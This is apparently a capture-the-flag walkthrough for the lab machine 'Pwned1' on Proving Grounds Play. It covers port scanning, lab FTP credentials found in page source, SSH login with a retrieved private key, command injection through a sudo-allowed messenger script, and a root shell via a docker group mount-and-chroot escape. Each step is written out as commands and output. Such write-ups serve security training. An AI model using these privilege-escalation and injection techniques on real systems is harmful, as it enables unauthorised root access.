---
layout: default
title: Pwned1
parent: Proving Grounds Play
nav_order: 30
---

# Scanning

---

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/pwned1]
└─$ sudo nmap -Pn -p- -sC -sV -T4 --open 192.168.213.95
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-13 17:59 EST
Nmap scan report for 192.168.213.95
Host is up (0.056s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 fe:cd:90:19:74:91:ae:f5:64:a8:a5:e8:6f:6e:ef:7e (RSA)
|   256 81:32:93:bd:ed:9b:e7:98:af:25:06:79:5f:de:91:5d (ECDSA)
|_  256 dd:72:74:5d:4d:2d:a3:62:3e:81:af:09:51:e0:14:4a (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Pwned....!!
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.61 seconds

```

# Enumeration

---

## 80 | HTTP

![index](../../../assets/images/ctfs/proving_grounds/pwned1/index.png)

![sings](../../../assets/images/ctfs/proving_grounds/pwned1/sings.png)

### WFUZZ/Gobuster

![robots](../../../assets/images/ctfs/proving_grounds/pwned1/robots.png)

_/nothing_

_/hidden_text_

![dict](../../../assets/images/ctfs/proving_grounds/pwned1/dict.png)

_/hacked_

![login](../../../assets/images/ctfs/proving_grounds/pwned1/login.png)

![creds](../../../assets/images/ctfs/proving_grounds/pwned1/creds.png)

```bash
//	if ($un=='ftpuser' && $pw=='B0ss_Pr!ncesS') {
```

# Exploitation

---

## Logon to FTP with Found Creds

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/pwned1]
└─$ ftp 192.168.213.95
Connected to 192.168.213.95.
220 (vsFTPd 3.0.3)
Name (192.168.213.95:vagrant): ftpuser
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
229 Entering Extended Passive Mode (|||12595|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Jul 10  2020 share
226 Directory send OK.
ftp> cd share
250 Directory successfully changed.
ftp> dir
229 Entering Extended Passive Mode (|||5179|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0            2602 Jul 09  2020 id_rsa
-rw-r--r--    1 0        0              75 Jul 09  2020 note.txt
226 Directory send OK.
ftp> get note.txt
local: note.txt remote: note.txt
229 Entering Extended Passive Mode (|||37941|)
150 Opening BINARY mode data connection for note.txt (75 bytes).
100% |***********************************************************|    75        1.58 MiB/s    00:00 ETA
226 Transfer complete.
75 bytes received in 00:00 (1.40 KiB/s)
ftp> get id_rsa
local: id_rsa remote: id_rsa
229 Entering Extended Passive Mode (|||15413|)
150 Opening BINARY mode data connection for id_rsa (2602 bytes).
100% |***********************************************************|  2602       26.12 MiB/s    00:00 ETA
226 Transfer complete.
2602 bytes received in 00:00 (46.59 KiB/s)

```

Discover username _ariana_ in _note.txt_

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/pwned1]
└─$ cat note.txt

Wow you are here

ariana won't happy about this note

sorry ariana :(

```

Authenticate to SSH service on target as _ariana_ with _id_rsa_

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/pwned1]
└─$ ssh -i id_rsa ariana@192.168.213.95
The authenticity of host '192.168.213.95 (192.168.213.95)' can't be established.
ED25519 key fingerprint is SHA256:Eu7UdscPxuaxyzophLkeILniUaKCge0R96HjWhAmpyk.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.213.95' (ED25519) to the list of known hosts.
Linux pwned 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
ariana@pwned:~$ id
uid=1000(ariana) gid=1000(ariana) groups=1000(ariana),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth)

```

# Post-Exploitation

---

## Check Sudo Permissions

We have the ability to run _/home/messenger_ as \*selena

```bash
ariana@pwned:/home$ sudo -l
Matching Defaults entries for ariana on pwned:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User ariana may run the following commands on pwned:
    (selena) NOPASSWD: /home/messenger.sh

```

There is a _messenger.sh_ script in the _/home_ directory.

```bash
ariana@pwned:/home$ cat messenger.sh
#!/bin/bash

clear
echo "Welcome to linux.messenger "
                echo ""
users=$(cat /etc/passwd | grep home |  cut -d/ -f 3)
                echo ""
echo "$users"
                echo ""
read -p "Enter username to send message : " name
                echo ""
read -p "Enter message for $name :" msg
                echo ""
echo "Sending message to $name "

$msg 2> /dev/null

                echo ""
echo "Message sent to $name :) "
                echo ""

```

If we execute the script we should be able to exploit the _$msg 2> /dev/null_ to get a _bash_ shell as _Selena_ since is the user we are running the script as.

```bash
ariana@pwned:/home$ sudo -u selena /home/messenger.sh


Welcome to linux.messenger


ariana:
selena:
ftpuser:

Enter username to send message : selena

Enter message for selena :/bin/bash

Sending message to selena
id
uid=1001(selena) gid=1001(selena) groups=1001(selena),115(docker)


```

## Exploit Docker Permissions

As we can see above, Selena is in the _docker_ group.

We can see which Docker images are on this machine

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
selena@pwned:/home$ docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
privesc             latest              09ae39f0f8fc        3 years ago         88.3MB
<none>              <none>              e13ad046d435        3 years ago         88.3MB
alpine              latest              a24bb4013296        3 years ago         5.57MB
debian              wheezy              10fcec6d95c4        4 years ago         88.3MB

```

According to GTFOBins we can exploit _docker_ to get a root shell

![gtfobins](../../../assets/images/ctfs/proving_grounds/pwned1/gtfobins.png)

```bash
selena@pwned:/home$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# id
uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
# whoami
root

```
